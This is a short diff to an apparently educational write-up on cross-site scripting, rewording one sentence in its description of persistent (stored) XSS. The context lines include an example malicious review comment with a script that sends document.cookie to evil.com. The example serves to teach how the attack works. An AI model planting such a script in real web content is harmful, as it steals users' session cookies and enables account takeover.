@@ -178,7 +178,7 @@ These are types of attacks where malicous scripts usually in the form of Javascr
 
 - <b>Persistent (stored):</b> This is a bit different where the attacker would also find a vulnerable input field, but one that stores data in a database. Somes fields include the review section on amazon, comments, message forums, etc... This does not require a user to click a link like in non-persistent XSS, a user simply just has to visit the webpage like normal web browsing. 
 
-  An attacker would post a comment along with the malicious script. For instance: 
+  An attacker would post a comment along with the malicious script. An example would be:  
   ```javascript
   Great product, it works pretty good! <script>fetch('http://evil.com/steal?c=' + document.cookie)</script>
   ```
